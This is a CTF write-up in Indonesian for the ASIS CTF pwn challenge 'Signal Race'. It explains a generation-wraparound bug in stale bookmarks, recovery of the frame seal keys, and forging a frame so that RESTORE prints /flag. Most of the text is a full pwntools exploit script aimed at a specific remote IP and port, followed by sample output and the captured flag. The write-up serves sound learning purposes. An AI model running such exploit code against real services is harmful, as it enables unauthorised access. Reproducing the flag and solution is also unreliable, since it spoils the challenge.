---
title: "Signal Race"
ctf: "ASIS CTF"
date: 2026-08-30
category: pwn
difficulty: medium
points: 0
flag_format: "ASIS{...}"
author: "nata"
---

# Signal Race

## Summary

Challenge ini adalah VM service dengan object table berukuran tetap, bookmark 4 slot, dan mekanisme checkpoint/restore berbasis `SIGALRM`. Bug utamanya ada pada bookmark validation: bookmark hanya menyimpan selector dan 1 byte generation, jadi setelah sebuah slot di-recycle cukup banyak kali, bookmark lama bisa dipakai lagi untuk membaca dan menulis object baru pada selector yang sama.

## Solution

### Step 1: Reuse a stale bookmark as arbitrary frame access

`NOTE <hex>` membuat object tipe note dan `BOOKMARK <selector>` menyimpan selector plus low byte generation. `DROP` menaikkan generation slot, tetapi `READ` dan `WRITE` hanya membandingkan low byte itu. Karena `NEW` dan `DROP` pada slot yang sama selalu menaikkan generation, kita bisa:

1. Buat note, bookmark note tersebut, lalu drop.
2. Spam `NEW` lalu `DROP` pada selector yang sama sampai low byte generation wrap kembali.
3. Buat `NEW` sekali lagi sehingga bookmark lama sekarang valid terhadap sebuah frame.

Setelah itu `READ 0 0 192` memberi dump penuh frame, dan `WRITE 0 0 <hex>` memberi write primitive ke frame tersebut.

### Step 2: Forge a sealed `/flag` frame and trigger restore

Frame dilindungi dua seal 64-bit dan satu checksum 32-bit. Karena satu frame valid bisa dibaca penuh, key per-session untuk kedua seal bisa direcover langsung dari field frame yang ada. Setelah itu cukup ubah:

- dword di offset `+0x04` menjadi `0x5352858a`
- path di offset `+0x24` menjadi `"/flag\\0\\0\\0"`
- seal di offset `+0x18`
- seal di offset `+0x94`
- checksum di offset `+0x20`

Lalu set timer, jalankan bytecode `92 <selector> 6f`, dan panggil `RESTORE`. Saat restore berhasil, service membaca path `/flag` dari frame palsu dan mencetak isi memfd flag.

```python
#!/usr/bin/env python3
from pwn import remote

HOST = "91.107.187.160"
PORT = 18121

MASK = (1 << 64) - 1
C1 = 0xFF51AFD7ED558CCD
C2 = 0xC4CEB9FE1A85EC53
CONST = 0x803196D6A2A4C21C
FNV_PRIME = 0x1000193
FNV_OFFSET = 0xCA81E7E2
INV1 = pow(C1, -1, 1 << 64)
INV2 = pow(C2, -1, 1 << 64)


def u16(buf, off):
    return int.from_bytes(buf[off:off + 2], "little")


def u32(buf, off):
    return int.from_bytes(buf[off:off + 4], "little")


def u64(buf, off):
    return int.from_bytes(buf[off:off + 8], "little")


def p32(val):
    return val.to_bytes(4, "little")


def p64(val):
    return val.to_bytes(8, "little")


def unxorshift_right(val, shift=33):
    out = val
    for _ in range(3):
        out = val ^ (out >> shift)
    return out & MASK


def fmix64(val):
    val &= MASK
    val ^= val >> 33
    val = (val * C1) & MASK
    val ^= val >> 33
    val = (val * C2) & MASK
    val ^= val >> 33
    return val & MASK


def ifmix64(val):
    val = unxorshift_right(val, 33)
    val = (val * INV2) & MASK
    val = unxorshift_right(val, 33)
    val = (val * INV1) & MASK
    val = unxorshift_right(val, 33)
    return val


def inner_mix(path_qword, word8):
    val = ((word8 << 48) ^ path_qword) & MASK
    val ^= val >> 33
    val = (val * C1) & MASK
    val ^= val >> 33
    val = (val * C2) & MASK
    return val


def seal_a(key_a, frame):
    inner = inner_mix(u64(frame, 0x24), u16(frame, 0x08))
    mixed = u64(frame, 0x10)
    mixed ^= (inner >> 33) ^ key_a
    mixed ^= (u32(frame, 0x0C) << 17) & MASK
    mixed ^= (u32(frame, 0x00) << 32) | u32(frame, 0x04)
    mixed ^= inner ^ CONST
    return fmix64(mixed)


def seal_b(key_b, frame):
    mixed = ((u16(frame, 0x0A) << 48) | u16(frame, 0x08)) & MASK
    mixed ^= key_b
    mixed ^= u64(frame, 0x10)
    mixed ^= u64(frame, 0x18)
    mixed ^= (u32(frame, 0x04) << 19) & MASK
    mixed ^= CONST
    return fmix64(mixed)


def frame_checksum(frame):
    data = bytearray(frame[:0x9C])
    data[0x20:0x24] = b"\x00" * 4
    out = FNV_OFFSET
    for byte in data:
        out ^= byte
        out = (out * FNV_PRIME) & 0xFFFFFFFF
    return out


def derive_keys(frame):
    inner = inner_mix(u64(frame, 0x24), u16(frame, 0x08))
    key_a = ifmix64(u64(frame, 0x18))
    key_a ^= u64(frame, 0x10)
    key_a ^= inner >> 33
    key_a ^= (u32(frame, 0x0C) << 17) & MASK
    key_a ^= (u32(frame, 0x00) << 32) | u32(frame, 0x04)
    key_a ^= inner ^ CONST

    key_b = ifmix64(u64(frame, 0x94))
    key_b ^= ((u16(frame, 0x0A) << 48) | u16(frame, 0x08)) & MASK
    key_b ^= u64(frame, 0x10)
    key_b ^= u64(frame, 0x18)
    key_b ^= (u32(frame, 0x04) << 19) & MASK
    key_b ^= CONST
    return key_a & MASK, key_b & MASK


def recv_line(io):
    return io.recvline().decode().strip()


io = remote(HOST, PORT)
print(recv_line(io))

io.sendline(b"NOTE 41414141")
note_resp = recv_line(io)
print(note_resp)
selector = int(note_resp.split("note=")[1].split()[0])

io.sendline(f"BOOKMARK {selector}".encode())
print(recv_line(io))

io.sendline(f"DROP {selector}".encode())
print(recv_line(io))

for _ in range(127):
    io.sendline(b"NEW")
    frame_resp = recv_line(io)
    frame_sel = int(frame_resp.split("frame=")[1].split()[0])
    if frame_sel != selector:
        raise RuntimeError(f"unexpected selector reuse: {frame_sel} != {selector}")
    io.sendline(f"DROP {frame_sel}".encode())
    recv_line(io)

io.sendline(b"NEW")
print(recv_line(io))

io.sendline(b"READ 0 0 192")
frame = bytearray.fromhex(recv_line(io).split("=", 1)[1])

key_a, key_b = derive_keys(frame)

frame[0x04:0x08] = p32(0x5352858A)
frame[0x24:0x2C] = b"/flag\x00\x00\x00"
frame[0x18:0x20] = p64(seal_a(key_a, frame))
frame[0x94:0x9C] = p64(seal_b(key_b, frame))
frame[0x20:0x24] = p32(frame_checksum(frame))

io.sendline(f"WRITE 0 0 {frame.hex()}".encode())
print(recv_line(io))

io.sendline(b"TIMER 1000")
print(recv_line(io))

io.sendline(f"RUN {selector} 92{selector:02x}6f".encode())
print(recv_line(io))

io.sendline(b"RESTORE")
print(recv_line(io))
```

Contoh output:

```text
SR/1 release=588fce9879c77b15ca9d7383 chunk=192
OK note=18 len=4
OK bookmark=0
OK dropped=18
OK frame=18 gen=312
OK wrote=192
OK timer=1000
OK run checkpoint=1
OK ASIS{8d88aebc6d193672f1e3a2ddced7bc58b2769d1f}
```

## Flag

```text
ASIS{8d88aebc6d193672f1e3a2ddced7bc58b2769d1f}
```
